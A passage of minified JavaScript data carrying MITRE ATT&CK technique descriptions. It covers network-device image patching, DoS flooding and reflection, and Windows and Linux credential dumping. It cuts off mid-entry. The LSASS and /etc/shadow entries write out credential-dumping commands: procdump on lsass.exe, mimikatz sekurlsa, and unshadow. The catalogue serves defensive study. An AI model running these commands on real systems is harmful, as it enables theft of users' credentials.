href='https:\u002F\u002Fdrwho.virtadpt.net\u002Fimages\u002Fkilling_the_myth_of_cisco_ios_rootkits.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.usenix.org\u002Flegacy\u002Fevent\u002Fwoot\u002Ftech\u002Ffinal_files\u002FCui.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002F2015.zeronights.org\u002Fassets\u002Ffiles\u002F05-Nosenko.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.recurity-labs.com\u002Fresearch\u002FRecurityLabs_Developments_in_IOS_Forensics.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.blackhat.com\u002Fpresentations\u002Fbh-usa-09\u002FNEILSON\u002FBHUSA09-Neilson-NetscreenDead-SLIDES.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F004'\u003EROMMONkit\u003C\u002Fa\u003E method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1600'\u003EWeaken Encryption\u003C\u002Fa\u003E, authentication, via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1556\u002F004'\u003ENetwork Device Authentication\u003C\u002Fa\u003E, and perimeter defenses, via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1599'\u003ENetwork Boundary Bridging\u003C\u002Fa\u003E.  Adding new capabilities for the adversary’s purpose include \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056\u002F001'\u003EKeylogging\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1090\u002F003'\u003EMulti-hop Proxy\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1205\u002F001'\u003EPort Knocking\u003C\u002Fa\u003E.\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601\u002F002'\u003EDowngrade System Image\u003C\u002Fa\u003E, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F005'\u003ETFTP Boot\u003C\u002Fa\u003E. \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F004'\u003EROMMONkit\u003C\u002Fa\u003E to achieve persistence. ";xT.external_references=[{source_name:b,external_id:xU,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601\u002F001"},{source_name:"Killing the myth of Cisco IOS rootkits",url:"https:\u002F\u002Fdrwho.virtadpt.net\u002Fimages\u002Fkilling_the_myth_of_cisco_ios_rootkits.pdf",description:"Sebastian 'topo' Muñiz. (2008, May). Killing the myth of Cisco IOS rootkits. Retrieved October 20, 2020."},{source_name:"Killing IOS diversity myth",url:"https:\u002F\u002Fwww.usenix.org\u002Flegacy\u002Fevent\u002Fwoot\u002Ftech\u002Ffinal_files\u002FCui.pdf",description:"Ang Cui, Jatin Kataria, Salvatore J. Stolfo. (2011, August). Killing the myth of Cisco IOS diversity: recent advances in reliable shellcode design. Retrieved October 20, 2020."},{source_name:"Cisco IOS Shellcode",url:"http:\u002F\u002F2015.zeronights.org\u002Fassets\u002Ffiles\u002F05-Nosenko.pdf",description:"George Nosenko. (2015). CISCO IOS SHELLCODE: ALL-IN-ONE. Retrieved October 21, 2020."},{source_name:"Cisco IOS Forensics Developments",url:"https:\u002F\u002Fwww.recurity-labs.com\u002Fresearch\u002FRecurityLabs_Developments_in_IOS_Forensics.pdf",description:"Felix 'FX' Lindner. (2008, February). Developments in Cisco IOS Forensics. Retrieved October 21, 2020."},{source_name:"Juniper Netscreen of the Dead",url:"https:\u002F\u002Fwww.blackhat.com\u002Fpresentations\u002Fbh-usa-09\u002FNEILSON\u002FBHUSA09-Neilson-NetscreenDead-SLIDES.pdf",description:"Graeme Neilson . (2009, August). Juniper Netscreen of the Dead. Retrieved October 20, 2020."},{source_name:db,url:dc,description:dd},{source_name:de,url:df,description:dg}];xT["subtechnique-of"]=dh;xY.id=xZ;xY["object-type"]=a;xY.name="Network Address Translation Traversal";xY.description="Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and\u002For destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftools.ietf.org\u002Fhtml\u002Frfc1918'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601\u002F001'\u003EPatch System Image\u003C\u002Fa\u003E to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities";xY.external_references=[{source_name:b,external_id:xZ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1599\u002F001"},{source_name:"RFC1918",url:"https:\u002F\u002Ftools.ietf.org\u002Fhtml\u002Frfc1918",description:"IETF Network Working Group. (1996, February). Address Allocation for Private Internets. Retrieved October 20, 2020."}];xY["subtechnique-of"]=fY;x_.id=x$;x_["object-type"]=a;x_.name="Direct Network Flood";x_.description="Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1498\u002F001'\u003EDirect Network Flood\u003C\u002Fa\u003E are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.justice.gov\u002Fopa\u002Fpr\u002Fseven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";x_.external_references=[{source_name:b,external_id:x$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1498\u002F001"},{external_id:qZ,source_name:c,url:q_},{external_id:"CAPEC-486",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F486.html"},{source_name:ri,url:rj,description:rk},{source_name:at,url:au,description:av}];x_["subtechnique-of"]=di;ya.id=yb;ya["object-type"]=a;ya.name="Reflection Amplification";ya.description="Adversaries may attempt to cause a denial of service by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflector may be used to focus traffic on the target.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.cloudflare.com\u002Freflections-on-reflections\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cloudflare.com\u002Flearning\u002Fddos\u002Fdns-amplification-ddos-attack\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and NTP\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cloudflare.com\u002Flearning\u002Fddos\u002Fntp-amplification-ddos-attack\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, though the use of several others in the wild have been documented.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpages.arbornetworks.com\u002Frs\u002F082-KNA-087\u002Fimages\u002F13th_Worldwide_Infrastructure_Security_Report.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.cloudflare.com\u002Fmemcrashed-major-amplification-attacks-from-port-11211\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";ya.external_references=[{source_name:b,external_id:yb,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1498\u002F002"},{external_id:"CAPEC-490",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F490.html"},{source_name:"Cloudflare ReflectionDoS May 2017",url:"https:\u002F\u002Fblog.cloudflare.com\u002Freflections-on-reflections\u002F",description:"Marek Majkowsk, Cloudflare. (2017, May 24). Reflections on reflection (attacks). Retrieved April 23, 2019."},{source_name:"Cloudflare DNSamplficationDoS",url:"https:\u002F\u002Fwww.cloudflare.com\u002Flearning\u002Fddos\u002Fdns-amplification-ddos-attack\u002F",description:"Cloudflare. (n.d.). What is a DNS amplification attack?. Retrieved April 23, 2019."},{source_name:"Cloudflare NTPamplifciationDoS",url:"https:\u002F\u002Fwww.cloudflare.com\u002Flearning\u002Fddos\u002Fntp-amplification-ddos-attack\u002F",description:"Cloudflare. (n.d.). What is a NTP amplificaiton attack?. Retrieved April 23, 2019."},{source_name:cJ,url:cK,description:cL},{source_name:"Cloudflare Memcrashed Feb 2018",url:"https:\u002F\u002Fblog.cloudflare.com\u002Fmemcrashed-major-amplification-attacks-from-port-11211\u002F",description:"Marek Majkowski of Cloudflare. (2018, February 27). Memcrashed - Major amplification attacks from UDP port 11211. Retrieved April 18, 2019."},{source_name:at,url:au,description:av}];ya["subtechnique-of"]=di;yA.id=yB;yA["object-type"]=a;yA.name="\u002Fetc\u002Fpasswd and \u002Fetc\u002Fshadow";yA.description="Adversaries may attempt to dump the contents of \u003Ccode\u003E\u002Fetc\u002Fpasswd\u003C\u002Fcode\u003E and \u003Ccode\u003E\u002Fetc\u002Fshadow\u003C\u002Fcode\u003E to enable offline password cracking. Most modern Linux operating systems use a combination of \u003Ccode\u003E\u002Fetc\u002Fpasswd\u003C\u002Fcode\u003E and \u003Ccode\u003E\u002Fetc\u002Fshadow\u003C\u002Fcode\u003E to store user account information including password hashes in \u003Ccode\u003E\u002Fetc\u002Fshadow\u003C\u002Fcode\u003E. By default, \u003Ccode\u003E\u002Fetc\u002Fshadow\u003C\u002Fcode\u003E is only readable by the root user.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.tldp.org\u002FLDP\u002Flame\u002FLAME\u002Flinux-admin-made-easy\u002Fshadow-file-formats.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cyberciti.biz\u002Ffaq\u002Funix-linux-password-cracking-john-the-ripper\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Ccode\u003E# \u002Fusr\u002Fbin\u002Funshadow \u002Fetc\u002Fpasswd \u002Fetc\u002Fshadow \u003E \u002Ftmp\u002Fcrack.password.db\u003C\u002Fcode\u003E\n";yA.external_references=[{url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003\u002F008",external_id:yB,source_name:b},{description:"The Linux Documentation Project. (n.d.). Linux Password and Shadow File Formats. Retrieved February 19, 2020.",url:"https:\u002F\u002Fwww.tldp.org\u002FLDP\u002Flame\u002FLAME\u002Flinux-admin-made-easy\u002Fshadow-file-formats.html",source_name:"Linux Password and Shadow File Formats"},{description:"Vivek Gite. (2014, September 17). Linux Password Cracking: Explain unshadow and john Commands (John the Ripper Tool). Retrieved February 19, 2020.",url:"https:\u002F\u002Fwww.cyberciti.biz\u002Ffaq\u002Funix-linux-password-cracking-john-the-ripper\u002F",source_name:"nixCraft - John the Ripper"}];yA["subtechnique-of"]=P;yC.id=yD;yC["object-type"]=a;yC.name="Cached Domain Credentials";yC.description="Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2012-r2-and-2012\u002Fhh994565(v%3Dws.11)'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpasslib.readthedocs.io\u002Fen\u002Fstable\u002Flib\u002Fpasslib.hash.msdcc2.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110\u002F002'\u003EPassword Cracking\u003C\u002Fa\u003E to recover the plaintext password.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fired.team\u002Foffensive-security\u002Fcredential-access-and-credential-dumping\u002Fdumping-and-cracking-mscash-cached-domain-credentials'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nWith SYSTEM access, the tools\u002Futilities such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0002'\u003EMimikatz\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0075'\u003EReg\u003C\u002Fa\u003E, and secretsdump.py can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpasslib.readthedocs.io\u002Fen\u002Fstable\u002Flib\u002Fpasslib.hash.msdcc2.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";yC.external_references=[{source_name:b,external_id:yD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003\u002F005"},{source_name:"Microsoft - Cached Creds",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2012-r2-and-2012\u002Fhh994565(v%3Dws.11)",description:"Microsfot. (2016, August 21). Cached and Stored Credentials Technical Overview. Retrieved February 21, 2020."},{source_name:"PassLib mscache",url:"https:\u002F\u002Fpasslib.readthedocs.io\u002Fen\u002Fstable\u002Flib\u002Fpasslib.hash.msdcc2.html",description:"Eli Collins. (2016, November 25). Windows' Domain Cached Credentials v2. Retrieved February 21, 2020."},{source_name:"ired mscache",url:"https:\u002F\u002Fired.team\u002Foffensive-security\u002Fcredential-access-and-credential-dumping\u002Fdumping-and-cracking-mscash-cached-domain-credentials",description:"Mantvydas Baranauskas. (2019, November 16). Dumping and Cracking mscash - Cached Domain Credentials. Retrieved February 21, 2020."},{url:bN,description:bO,source_name:bP}];yC["subtechnique-of"]=P;yE.id=yF;yE["object-type"]=a;yE.name="DCSync";yE.description="Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fcc228086.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fdd207691.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwiki.samba.org\u002Findex.php\u002FDRSUAPI'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsource.winehq.org\u002FWineAPI\u002Fsamlib.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=1729'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558\u002F001'\u003EGolden Ticket\u003C\u002Fa\u003E for use in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F003'\u003EPass the Ticket\u003C\u002Fa\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fredteaming\u002Fmimikatz-and-dcsync-and-extrasids-oh-my\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E or change an account's password as noted in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1098'\u003EAccount Manipulation\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.stealthbits.com\u002Fmanipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nDCSync functionality has been included in the \"lsadump\" module in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0002'\u003EMimikatz\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fgentilkiwi\u002Fmimikatz\u002Fwiki\u002Fmodule-~-lsadump'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fcc237008.aspx'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";yE.external_references=[{source_name:b,external_id:yF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003\u002F006"},{url:yh,description:yi,source_name:yj},{url:yk,description:yl,source_name:ym},{url:yn,description:yo,source_name:yp},{url:"https:\u002F\u002Fsource.winehq.org\u002FWineAPI\u002Fsamlib.html",description:"Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017.",source_name:"Wine API samlib.dll"},{url:f_,description:"Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017.",source_name:"ADSecurity Mimikatz DCSync"},{url:fZ,description:"Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017.",source_name:"Harmj0y Mimikatz and DCSync"},{url:iC,description:iD,source_name:iE},{url:"https:\u002F\u002Fgithub.com\u002Fgentilkiwi\u002Fmimikatz\u002Fwiki\u002Fmodule-~-lsadump",description:"Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017.",source_name:"GitHub Mimikatz lsadump Module"},{url:ys,description:yt,source_name:yu},{url:yv,description:yw,source_name:yx},{url:f_,description:yy,source_name:yz},{url:fZ,description:yq,source_name:yr}];yE["subtechnique-of"]=P;yG.id=yH;yG["object-type"]=a;yG.name="LSA Secrets";yG.description="Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.passcape.com\u002Findex.php?section=docsys&cmd=details&id=23'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-server\u002Fidentity\u002Fsecuring-privileged-access\u002Fsecuring-privileged-access-reference-material?redirectedfrom=MSDN'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.first.org\u002Fresources\u002Fpapers\u002Fconf2017\u002FWindows-Credentials-Attacks-and-Mitigation-Techniques.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E LSA secrets are stored in the registry at \u003Ccode\u003EHKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets\u003C\u002Fcode\u003E. LSA secrets can also be dumped from memory.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fired.team\u002Foffensive-security\u002Fcredential-access-and-credential-dumping\u002Fdumping-lsa-secrets'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0075'\u003EReg\u003C\u002Fa\u003E can be used to extract from the Registry. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0002'\u003EMimikatz\u003C\u002Fa\u003E can be used to extract secrets from memory.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fired.team\u002Foffensive-security\u002Fcredential-access-and-credential-dumping\u002Fdumping-lsa-secrets'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";yG.external_references=[{source_name:b,external_id:yH,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003\u002F004"},{source_name:"Passcape LSA Secrets",url:"https:\u002F\u002Fwww.passcape.com\u002Findex.php?section=docsys&cmd=details&id=23",description:"Passcape. (n.d.). Windows LSA secrets. Retrieved February 21, 2020."},{source_name:"Microsoft AD Admin Tier Model",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-server\u002Fidentity\u002Fsecuring-privileged-access\u002Fsecuring-privileged-access-reference-material?redirectedfrom=MSDN",description:"Microsoft. (2019, February 14). Active Directory administrative tier model. Retrieved February 21, 2020."},{source_name:"Tilbury Windows Credentials",url:"https:\u002F\u002Fwww.first.org\u002Fresources\u002Fpapers\u002Fconf2017\u002FWindows-Credentials-Attacks-and-Mitigation-Techniques.pdf",description:"Chad Tilbury. (2017, August 8). 1Windows Credentials: Attack, Mitigation, Defense. Retrieved February 21, 2020."},{source_name:"ired Dumping LSA Secrets",url:"https:\u002F\u002Fired.team\u002Foffensive-security\u002Fcredential-access-and-credential-dumping\u002Fdumping-lsa-secrets",description:"Mantvydas Baranauskas. (2019, November 16). Dumping LSA Secrets. Retrieved February 21, 2020."},{url:bN,description:bO,source_name:bP}];yG["subtechnique-of"]=P;yI.id=yJ;yI["object-type"]=a;yI.name="LSASS Memory";yI.description="Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0008'\u003ELateral Movement\u003C\u002Fa\u003E using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550'\u003EUse Alternate Authentication Material\u003C\u002Fa\u003E.\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* \u003Ccode\u003Eprocdump -ma lsass.exe lsass_dump\u003C\u002Fcode\u003E\n\nLocally, mimikatz can be run using:\n\n* \u003Ccode\u003Esekurlsa::Minidump lsassdump.dmp\u003C\u002Fcode\u003E\n* \u003Ccode\u003Esekurlsa::logonPasswords\u003C\u002Fcode\u003E\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: \u003Ccode\u003EHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\u003C\u002Fcode\u003E and \u003Ccode\u003EHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages\u003C\u002Fcode\u003E. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fdocplayer.net\u002F20839173-Analysis-of-malicious-security-support-provider-dlls.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.technet.microsoft.com\u002Faskpfeplat\u002F2016\u002F04\u002F18\u002Fthe-importance-of-kb2871997-and-kb2928120-for-credential-protection\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblogs.technet.microsoft.com\u002Faskpfeplat\u002F2016\u002F04\u002F18\u002Fthe-importance-of-kb2871997-and-kb2928120-for-credential-protection\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n";yI.external_references=[{source_name:b,external_id:yJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003\u002F001"},{url:eb,description:ec,source_name:ed},{url:"https:\u002F\u002Fblogs.technet.microsoft.com\u002Faskpfeplat\u002F2016\u002F04\u002F18\u002Fthe-importance-of-kb2871997-and-kb2928120-for-credential-protection\u002F",description:"Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018.",source_name:"TechNet Blogs Credential Protection"},{description:dj,url:dk,source_name:dl},{url:bN,description:bO,source_name:bP}];yI["subtechnique-of"]=P;yK.id=yL;yK["object-type"]=a;yK.name="NTDS";yK.description="Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in \u003Ccode\u003E%SystemRoot%\\NTDS\\Ntds.dit\u003C\u002Fcode\u003E of a domain controller.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FActive_Directory'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn addition to looking for NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fadsecurity.org\u002F?p=1275'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe following tools and techniques can be used to enumerate the NTDS file and the 